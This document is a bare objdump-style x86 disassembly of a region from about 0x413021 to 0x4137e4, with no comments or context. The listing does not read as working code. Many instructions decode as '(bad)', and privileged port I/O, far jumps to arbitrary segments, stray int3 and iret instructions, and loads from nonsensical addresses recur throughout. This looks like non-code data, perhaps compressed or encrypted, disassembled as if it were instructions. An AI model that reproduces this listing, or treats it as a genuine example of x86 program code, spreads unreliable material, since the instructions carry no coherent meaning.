  413021:	imul   eax,ebp,0xfffffff9
  413024:	and    DWORD PTR [edi],eax
  413026:	fld    TBYTE PTR [edx+esi*8+0x50d7946f]
  41302d:	add    eax,0x510b1015
  413032:	fdiv   st(4),st
  413034:	sbb    eax,0xd954b066
  413039:	scas   al,BYTE PTR es:[edi]
  41303a:	add    ebp,eax
  41303c:	fndisi(8087 only) 
  41303e:	test   al,0xe3
  413040:	jno    0x412fc8
  413042:	lods   al,BYTE PTR ds:[esi]
  413043:	rcr    BYTE PTR [ebx-0x6b],0x9
  413047:	jecxz  0x413020
  413049:	add    edx,DWORD PTR [ecx-0x3de5704b]
  41304f:	pop    esi
  413050:	add    ch,BYTE PTR [eax+edx*2-0x27]
  413054:	mov    bh,0xe
  413056:	loopne 0x41300a
  413058:	mov    edx,0xe1e345dc
  41305d:	pop    ecx
  41305e:	xchg   esi,eax
  41305f:	jp     0x412fe9
  413061:	cmp    DWORD PTR [ecx-0x5d],edi
  413064:	int3   
  413065:	dec    ecx
  413066:	dec    ebp
  413067:	cmp    al,0x82
  413069:	mov    WORD PTR ds:0x814337b0,?
  41306f:	mov    al,ds:0xb9ac7570
  413074:	mov    esp,0x6e90af2
  413079:	aaa    
  41307a:	fbld   TBYTE PTR [esi+0x47]
  41307d:	jo     0x413028
  41307f:	bound  esi,QWORD PTR [edx-0x7ef9115b]
  413085:	(bad)  
  413086:	test   al,0x22
  413088:	mov    gs,WORD PTR [edi-0x11]
  41308b:	mov    al,0xca
  41308d:	fistp  QWORD PTR [esi+0x79]
  413090:	sub    edx,DWORD PTR [esi]
  413092:	and    DWORD PTR [edx+0x4982589d],edx
  413098:	xor    eax,0x75e0003b
  41309d:	pop    edi
  41309e:	push   ss
  41309f:	into   
  4130a0:	sbb    DWORD PTR [eax],edx
  4130a2:	loopne 0x41309b
  4130a4:	jp     0x4130f3
  4130a6:	sbb    al,0xed
  4130a8:	adc    eax,DWORD PTR [edi-0xa95705c]
  4130ae:	mov    bl,0x10
  4130b0:	adc    dh,BYTE PTR ds:0x3d10bd8b
  4130b6:	enter  0xcbda,0x28
  4130ba:	(bad)
  4130be:	xchg   ebp,eax
  4130bf:	push   ecx
  4130c0:	jne    0x41313d
  4130c2:	loopne 0x41304b
  4130c4:	xor    al,BYTE PTR [edi-0x11]
  4130c7:	rcr    esp,1
  4130c9:	push   edx
  4130ca:	popf   
  4130cb:	fist   DWORD PTR [ecx+0x3df71969]
  4130d1:	fcom   QWORD PTR [ebx]
  4130d3:	jge    0x4130bc
  4130d5:	in     eax,dx
  4130d6:	dec    ebp
  4130d7:	int3   
  4130d8:	ficom  WORD PTR [ebx+0x6b]
  4130db:	cmp    bl,BYTE PTR [edx-0x53f95b55]
  4130e1:	mov    dh,0xa0
  4130e3:	(bad)  
  4130e5:	jne    0x413117
  4130e7:	sbb    BYTE PTR [ecx],bl
  4130e9:	daa    
  4130ea:	test   edx,ebx
  4130ec:	pminub mm3,QWORD PTR [edi-0x1988ade9]
  4130f3:	mov    bl,0xf9
  4130f5:	inc    ebp
  4130f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130f7:	mov    esp,0x76338c3b
  4130fc:	shr    BYTE PTR [ebx+0x1f],1
  4130ff:	cwde   
  413100:	push   ecx
  413101:	out    dx,eax
  413102:	pop    ds
  413103:	and    eax,0x27206020
  413108:	add    ebx,0xc
  41310b:	add    eax,0x7b4d8e5f
  413110:	fcmovbe st,st(0)
  413112:	mov    bl,0xef
  413114:	sahf   
  413115:	fsubr  QWORD PTR [edx]
  413117:	mov    edx,0x4c08dbe2
  41311c:	popf   
  41311d:	xor    dl,dh
  41311f:	cmp    al,0x56
  413121:	pop    edx
  413122:	std    
  413123:	inc    esi
  413124:	das    
  413125:	cmp    al,0x69
  413127:	fild   DWORD PTR [eax-0x5004e8e3]
  41312d:	mov    al,0xd1
  41312f:	adc    al,0xf0
  413131:	ds jmp 0x5a978d87
  413137:	rcr    BYTE PTR [ecx+ebx*2+0x27d95ad9],cl
  41313e:	out    0xf9,al
  413140:	aad    0x71
  413142:	mov    dl,0x9d
  413144:	push   esi
  413145:	dec    edi
  413146:	adc    bh,BYTE PTR [edi-0x1b]
  413149:	xchg   ebx,eax
  41314a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41314b:	sbb    BYTE PTR [edi],bl
  41314d:	push   ebp
  41314e:	or     eax,0x2626b35d
  413153:	mov    dh,BYTE PTR [ecx]
  413155:	cld    
  413156:	sbb    esp,esi
  413158:	test   DWORD PTR [esi+0x55],0xa5af46f6
  41315f:	fcmovbe st,st(7)
  413161:	cmp    ebp,DWORD PTR [ebp-0x2b]
  413164:	sbb    BYTE PTR [ebx-0x28],0x51
  413168:	ror    BYTE PTR [ecx+0x77],1
  41316b:	iret   
  41316c:	mov    eax,0x98b1a597
  413171:	daa    
  413172:	or     BYTE PTR [ebx+0x6221aee0],cl
  413178:	call   0xba4cb2a6
  41317d:	outs   dx,BYTE PTR cs:[esi]
  41317f:	(bad)  
  413180:	mov    ch,0x29
  413182:	ins    DWORD PTR es:[edi],dx
  413183:	aad    0x3b
  413185:	jmp    0xb284:0xf5a032a0
  41318c:	and    dl,bh
  41318e:	arpl   WORD PTR [edi],cx
  413190:	xor    BYTE PTR [esi+ebx*2-0x4a8f0ab5],0x6f
  413198:	test   al,0xf3
  41319a:	mov    ah,0x70
  41319c:	clc    
  41319d:	mov    ds:0x8b209b55,al
  4131a2:	inc    ecx
  4131a3:	int3   
  4131a4:	xchg   al,ch
  4131a6:	(bad)  
  4131a7:	sbb    al,0x56
  4131a9:	(bad)  
  4131ab:	push   esp
  4131ad:	xchg   DWORD PTR [eax+0x2e],eax
  4131b0:	jns    0x4131be
  4131b2:	adc    DWORD PTR [ecx+esi*8-0x3a3148ac],eax
  4131b9:	adc    al,0xee
  4131bb:	outs   dx,BYTE PTR ds:[esi]
  4131bc:	out    dx,eax
  4131bd:	mov    al,0x6e
  4131bf:	dec    eax
  4131c0:	or     DWORD PTR fs:[ecx+0x11],eax
  4131c4:	cwde   
  4131c5:	dec    edi
  4131c6:	cmp    eax,0x7e8867b6
  4131cb:	inc    ebx
  4131cc:	dec    esp
  4131cd:	into   
  4131ce:	cwde   
  4131cf:	pushf  
  4131d0:	sub    edx,DWORD PTR [edi+0x47ef4eab]
  4131d6:	sti    
  4131d7:	inc    esi
  4131d8:	sbb    ah,bl
  4131da:	(bad)  
  4131dc:	inc    ebx
  4131dd:	jecxz  0x413235
  4131df:	shl    BYTE PTR [edi+esi*4-0x60],0xd4
  4131e4:	mov    dl,0xa1
  4131e6:	or     dh,ch
  4131e8:	or     cl,al
  4131ea:	loopne 0x41322a
  4131ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ed:	jmp    0xf984ac94
  4131f2:	gs dec eax
  4131f4:	push   eax
  4131f5:	jl     0x41321c
  4131f7:	jno    0x413202
  4131f9:	jmp    0x4131c1
  4131fb:	xchg   edx,eax
  4131fc:	jge    0x4131d2
  4131fe:	mov    ebp,0xaf882239
  413203:	mov    dh,0x5f
  413205:	adc    eax,0xf9b801a
  41320a:	nop
  41320b:	ds in  al,dx
  41320d:	iret   
  41320e:	out    dx,al
  41320f:	dec    ebx
  413210:	ins    BYTE PTR es:[edi],dx
  413211:	xlat   BYTE PTR ds:[ebx]
  413212:	test   DWORD PTR [esi],ebx
  413214:	push   edi
  413215:	mov    edx,DWORD PTR [eax+0x33b49069]
  41321b:	stos   DWORD PTR es:[edi],eax
  41321c:	enter  0xf2ae,0xbc
  413220:	add    al,0x58
  413222:	mov    dl,0x8c
  413224:	idiv   BYTE PTR [edx+eiz*8+0x6e]
  413228:	test   BYTE PTR [ecx],bh
  41322a:	pop    edi
  41322b:	(bad)  
  41322d:	(bad)  
  41322f:	push   edx
  413230:	sti    
  413231:	lea    edx,[eax+0x6e771df0]
  413237:	xor    edx,esi
  413239:	add    eax,0xcc45b9e8
  41323e:	and    DWORD PTR [ecx],ebx
  413240:	dec    edi
  413241:	ds mov edx,DWORD PTR cs:[eax]
  413245:	aas    
  413246:	retf   0x18a4
  413249:	mov    BYTE PTR [eax+eax*1-0x53],al
  41324d:	adc    BYTE PTR [ecx+0x349c3197],ch
  413253:	mov    al,ds:0x26d52d56
  413258:	adc    ebx,edx
  41325a:	dec    ecx
  41325b:	js     0x413253
  41325d:	daa    
  41325e:	loopne 0x4132a6
  413260:	cdq    
  413261:	fcom   QWORD PTR [eax+edx*1-0x3d1274e9]
  413268:	mov    ebp,0x54e2a490
  41326d:	mov    ch,0x8b
  41326f:	int    0x36
  413271:	pop    ss
  413272:	mov    WORD PTR [ebx+0x2f],ds
  413275:	test   al,0xad
  413277:	mov    al,ds:0x80f6c275
  41327c:	dec    eax
  41327d:	cmp    eax,0x79bc75cc
  413282:	pop    esi
  413283:	add    esp,DWORD PTR [ebx-0x7c]
  413286:	shl    DWORD PTR [esi],cl
  413288:	les    edx,FWORD PTR [esi]
  41328a:	and    edx,eax
  41328c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41328d:	sub    al,0x57
  41328f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413290:	mov    ecx,0xa6c4207b
  413295:	je     0x4132e6
  413297:	mov    bh,0x5e
  413299:	or     eax,0xe0df1088
  41329e:	and    eax,0x95b74dc3
  4132a3:	jge    0x413269
  4132a5:	call   0x625a:0xea961b3c
  4132ac:	cmp    al,0xfd
  4132ae:	leave  
  4132af:	cs add eax,0xe9a5f347
  4132b5:	sbb    eax,DWORD PTR [eax+0x5d20ba82]
  4132bb:	sub    ecx,ebp
  4132bd:	addr16 pop eax
  4132bf:	mov    ch,0xb
  4132c1:	scas   eax,DWORD PTR es:[edi]
  4132c2:	pop    es
  4132c3:	xor    DWORD PTR [edi],0x7a
  4132c6:	imul   edx,DWORD PTR [esp+edx*8+0xa323869],0xffffffff
  4132ce:	iret   
  4132cf:	dec    esi
  4132d0:	fild   QWORD PTR [ebx+ebp*4]
  4132d3:	jno    0x4132ce
  4132d5:	xor    ebx,DWORD PTR [ecx+0x2f1fec70]
  4132db:	shr    al,0xec
  4132de:	fwait
  4132df:	cmp    eax,0xb0802f45
  4132e4:	dec    esp
  4132e5:	xchg   esi,eax
  4132e6:	add    al,0xaf
  4132e8:	jbe    0x413276
  4132ea:	add    DWORD PTR [ebx+eiz*8],0xffffffa4
  4132ee:	jnp    0x413293
  4132f0:	std    
  4132f1:	jle    0x4132f9
  4132f3:	mov    eax,0x16ea5082
  4132f8:	dec    edi
  4132f9:	outs   dx,BYTE PTR ds:[esi]
  4132fa:	cdq    
  4132fb:	sub    al,0xbd
  4132fd:	popf   
  4132fe:	fs test BYTE PTR fs:[ebp-0xd],bh
  413303:	aas    
  413304:	dec    eax
  413305:	out    dx,eax
  413306:	sbb    ah,dh
  413308:	add    eax,0xeb97c24b
  41330d:	retf   
  41330e:	stos   BYTE PTR es:[edi],al
  41330f:	gs cld 
  413311:	fist   WORD PTR [esi+0x46]
  413314:	xchg   esp,eax
  413315:	mov    dl,0xae
  413317:	push   0x5cc40156
  41331c:	mov    ebx,0x6deae929
  413321:	mov    cl,0x92
  413323:	add    eax,0xd0ea0fad
  413328:	inc    edx
  413329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41332a:	int3   
  41332b:	popf   
  41332c:	rcr    edi,cl
  41332e:	xor    bh,dh
  413330:	inc    ecx
  413331:	cs nop
  413333:	inc    eax
  413334:	shl    DWORD PTR [edi+ecx*4+0x53c752dc],cl
  41333b:	and    cl,bh
  41333d:	pop    ecx
  41333e:	fadd   DWORD PTR [esi]
  413340:	mov    al,0x44
  413342:	ror    BYTE PTR [ecx],1
  413344:	in     al,0x9d
  413346:	adc    edi,esi
  413348:	push   esi
  413349:	and    ebp,DWORD PTR [edx-0x2b]
  41334c:	mov    ebp,0x915b621
  413351:	aad    0x5e
  413353:	cld    
  413354:	jecxz  0x41335b
  413356:	fs shl ebp,cl
  413359:	sbb    al,0x76
  41335b:	pop    edi
  41335c:	or     ch,ah
  41335e:	div    DWORD PTR [edi-0x547197fb]
  413364:	add    BYTE PTR [ebx+0x5fdb0892],cl
  41336a:	adc    eax,0xa732f6e9
  41336f:	into   
  413370:	out    0x9b,al
  413372:	add    eax,0x9dea63c4
  413377:	test   eax,0x885a246d
  41337c:	mov    esp,0x7cc6ffe0
  413381:	push   ebx
  413382:	xchg   edi,eax
  413383:	and    BYTE PTR [ebx-0xcde79e3],ah
  413389:	push   edi
  41338a:	sbb    ch,al
  41338c:	inc    esp
  41338d:	xchg   ecx,eax
  41338f:	pop    ebx
  413390:	in     al,dx
  413391:	cmp    eax,0xebf4de0b
  413396:	cdq    
  413397:	jne    0x413417
  413399:	mov    dl,0x33
  41339b:	sub    al,0xca
  41339d:	aaa    
  41339e:	add    BYTE PTR [edi-0x69f0ff8],ch
  4133a4:	pop    edx
  4133a5:	push   0x6516f31e
  4133aa:	les    esp,FWORD PTR [edx+eiz*4+0x1a]
  4133ae:	ds mov al,0xed
  4133b1:	jae    0x41342a
  4133b3:	addr16 mov dh,0x9e
  4133b6:	dec    esi
  4133b7:	xor    esi,esi
  4133b9:	iret   
  4133ba:	dec    ecx
  4133bb:	xlat   BYTE PTR ds:[ebx]
  4133bc:	xor    cl,BYTE PTR [ebp-0x5d]
  4133bf:	dec    esi
  4133c0:	lds    esi,FWORD PTR [ecx-0x79]
  4133c3:	out    0x1c,al
  4133c5:	test   al,0x54
  4133c7:	cs xchg esp,eax
  4133c9:	xor    al,0x76
  4133cb:	adc    DWORD PTR [edi-0x7b6c9401],0xffffffc2
  4133d2:	cmc    
  4133d3:	cdq    
  4133d4:	ror    BYTE PTR [ebx],cl
  4133d6:	jge    0x41337d
  4133d8:	mov    edi,0x7390c6f1
  4133dd:	and    bh,bh
  4133df:	ins    DWORD PTR es:[edi],dx
  4133e0:	sub    eax,0x3929ced
  4133e5:	stos   DWORD PTR es:[edi],eax
  4133e6:	sub    eax,0x34d969b1
  4133eb:	push   es
  4133ec:	pop    esi
  4133ed:	lock pop eax
  4133ef:	jmp    0xdddf:0xfa2124f2
  4133f6:	fwait
  4133f7:	mov    ch,BYTE PTR [esi+edx*1+0x53]
  4133fb:	jbe    0x4133ed
  4133fd:	test   al,0xca
  4133ff:	shr    DWORD PTR [esi*2-0x773fe21d],1
  413406:	clc    
  413407:	(bad)  
  413408:	mov    ch,0xe3
  41340a:	xchg   ebx,eax
  41340b:	repnz mov edx,0x3173189a
  413411:	jnp    0x413447
  413413:	mov    ch,0x2c
  413415:	and    esp,0xdfba4e0b
  41341b:	xchg   ecx,eax
  41341c:	(bad)  
  41341d:	cmc    
  41341e:	daa    
  41341f:	out    dx,al
  413420:	pop    ds
  413421:	cs inc esp
  413423:	out    dx,eax
  413424:	xor    edi,DWORD PTR [esi]
  413426:	jns    0x413455
  413428:	add    eax,0xad51d653
  41342d:	aad    0xac
  41342f:	iret   
  413430:	jne    0x41343d
  413432:	setp   BYTE PTR [esi]
  413435:	lds    eax,FWORD PTR [edi-0x356239e7]
  41343b:	pop    esp
  41343c:	jbe    0x413458
  41343e:	das    
  41343f:	jmp    0x47ca:0x3a4b9ea0
  413446:	push   edx
  413447:	fsubr  DWORD PTR [ebp-0x6bb4106a]
  41344d:	in     al,dx
  41344e:	sbb    DWORD PTR [edx+0x65a37151],ebx
  413454:	ja     0x41344e
  413456:	jecxz  0x4134d0
  413458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413459:	pop    es
  41345a:	add    al,0x43
  41345c:	in     al,dx
  41345d:	aad    0xd0
  41345f:	mov    al,BYTE PTR [ecx]
  413461:	sti    
  413462:	pop    esi
  413463:	cmp    al,0x77
  413465:	fwait
  413466:	scas   eax,DWORD PTR es:[edi]
  413467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413468:	xlat   BYTE PTR ds:[ebx]
  413469:	xchg   DWORD PTR [esi+0xcfcd3ff],eax
  41346f:	outs   dx,BYTE PTR ds:[esi]
  413470:	fwait
  413471:	xchg   esp,eax
  413472:	loope  0x41344f
  413474:	cs addr16 push ebp
  413477:	cmp    BYTE PTR [esi+esi*4-0x74],bl
  41347b:	sti    
  41347c:	frndint 
  41347e:	imul   eax,ebx,0x7ce013a9
  413484:	push   ss
  413485:	daa    
  413486:	sahf   
  413487:	lods   al,BYTE PTR ds:[esi]
  413488:	int3   
  413489:	int    0xef
  41348b:	ja     0x41350a
  41348d:	inc    edx
  41348e:	out    0x94,al
  413490:	add    al,BYTE PTR [ecx-0x34]
  413493:	push   0x55dab780
  413498:	aaa    
  413499:	loop   0x41346d
  41349b:	add    eax,ebp
  41349d:	stc    
  41349e:	push   edi
  41349f:	push   edx
  4134a0:	cmp    al,0x3f
  4134a2:	and    BYTE PTR [edi-0x2a],al
  4134a5:	retf   0x4770
  4134a8:	pop    edx
  4134a9:	cmp    al,0x47
  4134ab:	mov    bh,0x41
  4134ad:	ins    BYTE PTR es:[edi],dx
  4134ae:	jbe    0x413528
  4134b0:	jns    0x413507
  4134b2:	sub    al,0xc1
  4134b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b5:	sbb    al,0xcc
  4134b7:	mov    cl,0x1a
  4134b9:	add    DWORD PTR [ebx-0x32ed7f2b],0xfb14d34a
  4134c3:	clc    
  4134c4:	iret   
  4134c5:	lods   eax,DWORD PTR ds:[esi]
  4134c6:	out    0xcc,al
  4134c8:	mov    edx,0x4b0609bf
  4134cd:	arpl   WORD PTR [eax+0x713caf3d],sp
  4134d3:	cdq    
  4134d4:	jl     0x4134fd
  4134d6:	pop    ebp
  4134d7:	js     0x4134ac
  4134d9:	clc    
  4134da:	outs   dx,BYTE PTR ds:[esi]
  4134db:	imul   edi,ecx,0xffffff8f
  4134de:	mov    esi,0xd8059686
  4134e4:	xor    esi,ecx
  4134e6:	adc    eax,0x68828b2a
  4134eb:	xor    edi,DWORD PTR [edi+edi*2-0x2a]
  4134ef:	(bad)  
  4134f0:	aas    
  4134f1:	shl    DWORD PTR [esi+0x27],0xc2
  4134f5:	xchg   edx,eax
  4134f6:	sbb    al,0xb6
  4134f8:	out    dx,eax
  4134f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134fa:	cmp    al,BYTE PTR [ecx+0x2526002c]
  413500:	cmp    DWORD PTR [ebx],edx
  413502:	jo     0x413556
  413504:	clc    
  413505:	jne    0x41350f
  413507:	mov    ds:0x5a42bcb5,eax
  41350c:	and    BYTE PTR [edx+0x1805e57e],0x97
  413513:	jmp    0x7f49758f
  413518:	mov    ss,WORD PTR [eax-0x1d]
  41351b:	sbb    dh,BYTE PTR [edi+0x332e0d96]
  413521:	and    BYTE PTR [ecx],cl
  413523:	clc    
  413524:	ds push cs
  413526:	out    dx,eax
  413527:	dec    edx
  413528:	rcl    bl,0xb7
  41352b:	adc    ch,BYTE PTR [eax]
  41352d:	sub    eax,0x12fe265f
  413532:	in     al,0x37
  413534:	leave  
  413535:	cs inc ebx
  413537:	inc    edi
  413538:	inc    ecx
  413539:	fimul  WORD PTR [eax+0x3cd3a93c]
  41353f:	push   esp
  413540:	jge    0x4135a1
  413542:	mov    bl,0x63
  413544:	adc    ah,BYTE PTR ds:0xc191f531
  41354a:	aas    
  41354b:	add    ch,ah
  41354d:	leave  
  41354e:	cmc    
  41354f:	jbe    0x41353a
  413551:	pushf  
  413552:	cmc    
  413553:	jnp    0x413534
  413555:	pop    ebx
  413556:	(bad)  
  413557:	jl     0x4134fb
  413559:	lock and eax,0x858ab04a
  41355f:	jbe    0x413526
  413561:	icebp  
  413562:	sbb    al,0xb7
  413564:	mov    bl,0xa4
  413566:	push   es
  413567:	div    ecx
  413569:	imul   ecx,DWORD PTR [edi+0x48],0x5f94ef15
  413570:	ds or  eax,0xe5780974
  413576:	cli    
  413577:	scas   eax,DWORD PTR es:[edi]
  413578:	fld    st(3)
  41357a:	fwait
  41357b:	mov    dh,BYTE PTR [edi-0x48]
  41357e:	sbb    eax,DWORD PTR [ecx]
  413580:	and    ecx,esp
  413582:	js     0x413563
  413584:	jne    0x41351d
  413586:	aas    
  413587:	push   es
  413588:	out    0xc3,eax
  41358a:	jb     0x413601
  41358c:	sbb    DWORD PTR [ebx+ebx*8+0x4c],ecx
  413590:	imul   ebx,DWORD PTR [ebx-0x65],0xffffffb5
  413594:	mov    eax,ds:0x2213285e
  413599:	sub    bl,al
  41359b:	lods   al,BYTE PTR ds:[esi]
  41359c:	fsubr  QWORD PTR [edi+eiz*1]
  41359f:	inc    edx
  4135a0:	mov    esi,0x6cf870e7
  4135a5:	xchg   BYTE PTR [ebp+0x18],al
  4135a8:	lods   eax,DWORD PTR ds:[esi]
  4135a9:	cmp    dh,BYTE PTR [edx+0x1a]
  4135ac:	or     al,0xe2
  4135ae:	out    0xcf,al
  4135b0:	int3   
  4135b1:	fistp  QWORD PTR [ebp+0x7]
  4135b4:	cld    
  4135b5:	fistp  WORD PTR [edx+0x3509d334]
  4135bb:	push   ss
  4135bc:	inc    eax
  4135bd:	xchg   ebx,eax
  4135be:	jb     0x41357b
  4135c0:	or     dl,BYTE PTR [edi]
  4135c2:	push   ebp
  4135c3:	es (bad) 
  4135c5:	cdq    
  4135c6:	outs   dx,DWORD PTR ds:[esi]
  4135c7:	cdq    
  4135c8:	test   DWORD PTR [esp+edx*2-0x3a4318bc],ebx
  4135cf:	retf   
  4135d0:	mov    al,0xca
  4135d2:	and    cl,0x61
  4135d5:	dec    ebp
  4135d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135d7:	arpl   WORD PTR [edi+0x6279dea6],bx
  4135dd:	nop
  4135de:	push   ds
  4135df:	cmp    BYTE PTR [ebx+eax*1],dh
  4135e2:	ror    DWORD PTR [edx],1
  4135e4:	std    
  4135e5:	mov    bl,0x67
  4135e7:	fld    TBYTE PTR [ebx*4+0x1195476c]
  4135ee:	out    dx,al
  4135ef:	call   0xc8b9fb81
  4135f4:	js     0x4135f7
  4135f6:	xchg   esi,eax
  4135f7:	test   eax,0x65ab291
  4135fc:	popf   
  4135fd:	xchg   edx,eax
  4135fe:	(bad)
  413601:	add    al,0xe3
  413603:	mov    ecx,0x7ed2c061
  413608:	sbb    al,0x4f
  41360a:	push   edi
  41360b:	fdivr  DWORD PTR [ecx]
  41360d:	inc    DWORD PTR [eax+0x61f540df]
  413613:	xchg   edx,eax
  413614:	out    dx,eax
  413615:	cmp    ecx,DWORD PTR [ebp-0x2d]
  413618:	call   0xba7:0xa649e4c1
  41361f:	mov    esp,0xc0936d4c
  413624:	mov    ch,0xd9
  413626:	mov    dh,0x22
  413628:	out    dx,eax
  413629:	ret    0x76bb
  41362c:	jbe    0x41360b
  41362e:	jmp    0x41362b
  413630:	lahf   
  413631:	cmp    dl,bh
  413633:	gs mov ecx,0x85460beb
  413639:	mov    edx,0xeab832dd
  41363e:	(bad)  [edx-0x1a215a32]
  413644:	pop    ebp
  413645:	and    dl,ah
  413647:	scas   al,BYTE PTR es:[edi]
  413648:	je     0x4136c9
  41364a:	push   cs
  41364b:	adc    DWORD PTR [edi],ecx
  41364d:	sub    DWORD PTR ds:0xd5e8a3fc,eax
  413653:	push   ds
  413654:	ins    BYTE PTR es:[edi],dx
  413655:	neg    ah
  413657:	sbb    BYTE PTR [ebx-0xa],cl
  41365a:	jecxz  0x413681
  41365c:	lods   al,BYTE PTR ds:[esi]
  41365d:	push   0xffffffef
  41365f:	sub    BYTE PTR [ecx-0x43],cl
  413662:	push   ebp
  413663:	clc    
  413664:	(bad)  
  413665:	dec    ecx
  413666:	mov    bl,0xc7
  413668:	push   esp
  413669:	inc    ecx
  41366a:	push   esi
  41366b:	je     0x4136db
  41366d:	stos   DWORD PTR es:[edi],eax
  41366e:	pop    ebp
  41366f:	popa   
  413670:	je     0x4136d9
  413672:	mov    ebx,0x89698e9b
  413677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413678:	inc    ecx
  413679:	xor    eax,0xf74c840e
  41367e:	xor    eax,0x22cf4d8c
  413683:	mov    ds:0xf9e083f,eax
  413688:	outs   dx,DWORD PTR ds:[esi]
  413689:	repnz (bad) 
  41368b:	es xor ebp,ebx
  41368e:	aam    0xf4
  413690:	xchg   esp,eax
  413691:	adc    al,0xf9
  413693:	jnp    0x4136ba
  413695:	into   
  413696:	jo     0x41362e
  413698:	xchg   ebx,edx
  41369a:	retf   0x8c5a
  41369d:	dec    DWORD PTR [ecx+0x1b]
  4136a0:	mov    al,ds:0xc6898d63
  4136a5:	mov    al,0x76
  4136a7:	(bad)  
  4136a8:	jno    0x41362e
  4136aa:	adc    eax,0x9ace4b85
  4136af:	mov    DWORD PTR [edi+0x7c],edx
  4136b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136b3:	rcl    bh,0x22
  4136b6:	sbb    ebp,DWORD PTR [edx]
  4136b8:	adc    DWORD PTR [edi+0x355538b6],edi
  4136be:	ins    DWORD PTR es:[edi],dx
  4136bf:	sub    DWORD PTR [ecx+0x5db1e519],edx
  4136c5:	or     DWORD PTR [edx-0x266df5da],ebp
  4136cb:	jns    0x413738
  4136cd:	pop    ebx
  4136ce:	popa   
  4136cf:	add    al,0x56
  4136d1:	fs push esi
  4136d3:	pop    edi
  4136d4:	add    BYTE PTR [eax],0x52
  4136d7:	jb     0x41370c
  4136d9:	(bad)  
  4136da:	dec    BYTE PTR [eax-0x15b2cbaa]
  4136e0:	mov    esi,0xe45c902c
  4136e5:	loope  0x413726
  4136e7:	or     eax,0x1d0d7314
  4136ec:	push   ecx
  4136ed:	mov    dl,0x69
  4136ef:	mov    dl,0x58
  4136f1:	(bad)  
  4136f2:	push   esi
  4136f3:	push   esp
  4136f4:	aaa    
  4136f5:	push   ebp
  4136f6:	and    al,al
  4136f8:	mov    edi,0xe7874d53
  4136fd:	mov    WORD PTR [ebp+0x5e],es
  413700:	enter  0x4477,0xb
  413704:	pop    es
  413705:	and    DWORD PTR [edi],edi
  413707:	mov    ah,0xb6
  413709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41370a:	mov    ds:0xa6c87dd6,eax
  41370f:	imul   esi,DWORD PTR [eax-0x53],0xd40f984a
  413716:	cwde   
  413717:	(bad)  
  413718:	fwait
  413719:	clc    
  41371a:	inc    edx
  41371b:	(bad)  
  41371c:	hlt    
  41371d:	mov    ds:0xa10db982,eax
  413722:	sbb    al,0x63
  413724:	gs dec edi
  413726:	adc    bl,BYTE PTR [edx+0x6f]
  413729:	mov    WORD PTR [edx+eax*1+0x2ce28370],gs
  413730:	jno    0x4137b1
  413732:	dec    esi
  413733:	test   BYTE PTR [ecx],bl
  413735:	jmp    0x413706
  413737:	stos   DWORD PTR es:[edi],eax
  413738:	sbb    al,0x9e
  41373a:	lods   al,BYTE PTR ds:[esi]
  41373b:	mov    dh,0x26
  41373d:	pusha  
  41373e:	push   es
  41373f:	cmp    eax,0xcd01096d
  413744:	int    0xdd
  413746:	pusha  
  413747:	stos   DWORD PTR es:[edi],eax
  413748:	ja     0x4136cd
  41374a:	retf   
  41374b:	xchg   esi,ebx
  41374d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413750:	mov    edi,ds
  413752:	scas   al,BYTE PTR es:[edi]
  413753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413754:	repz leave 
  413756:	or     BYTE PTR [esi],al
  413758:	adc    ebx,ebx
  41375a:	out    0x82,al
  41375c:	les    ebx,FWORD PTR [eax+0x61]
  41375f:	jmp    0xc0a1fe0d
  413764:	sbb    al,0x5e
  413766:	addr16 out dx,al
  413768:	adc    DWORD PTR [ecx],esp
  41376a:	sub    DWORD PTR [esi-0x6014359b],ebx
  413770:	jnp    0x413709
  413772:	popa   
  413773:	jns    0x4137a0
  413775:	add    DWORD PTR [edx+0x3bd76bab],0xb2ef75a2
  41377f:	pop    ebx
  413780:	clc    
  413781:	pop    esi
  413782:	nop
  413783:	sub    ebx,DWORD PTR [ecx]
  413785:	xchg   ebp,eax
  413786:	mov    dl,0x3d
  413788:	xchg   ebp,eax
  413789:	je     0x41375c
  41378b:	mov    dh,0xd0
  41378d:	mov    al,0x79
  41378f:	shr    BYTE PTR [eax+ebp*1-0x3f],1
  413793:	lahf   
  413794:	(bad)  
  413795:	lods   al,BYTE PTR ds:[esi]
  413796:	mov    ah,0x93
  413798:	xchg   ebx,eax
  413799:	sub    al,0x8c
  41379b:	mov    al,BYTE PTR [ecx-0x5dadb824]
  4137a1:	inc    esp
  4137a2:	mov    bl,0xf2
  4137a4:	pop    edi
  4137a5:	xchg   edx,eax
  4137a6:	sub    bh,BYTE PTR [ecx]
  4137a8:	retf   
  4137a9:	ss ss jnp 0x4137ce
  4137ad:	xchg   ecx,eax
  4137ae:	loopne 0x4137f8
  4137b0:	mov    ecx,0x101c591c
  4137b5:	clc    
  4137b6:	jl     0x4137ca
  4137b8:	sub    esp,DWORD PTR ds:0xc0dd3e9e
  4137be:	std    
  4137bf:	shl    BYTE PTR [edi-0xde74097],cl
  4137c5:	lods   eax,DWORD PTR ds:[esi]
  4137c6:	push   esp
  4137c7:	or     esi,eax
  4137c9:	pop    ebx
  4137ca:	stc    
  4137cb:	cwde   
  4137cc:	jle    0x413831
  4137ce:	inc    esi
  4137cf:	stos   DWORD PTR es:[edi],eax
  4137d0:	mov    eax,ds:0xc720a006
  4137d5:	ret    
  4137d6:	in     eax,dx
  4137d7:	imul   eax,DWORD PTR [edi+0x717b84be],0xffffffe7
  4137de:	mov    eax,DWORD PTR [ebx-0x6e]
  4137e1:	mov    bl,0x19
  4137e3:	push   edx
  4137e4:	(bad)
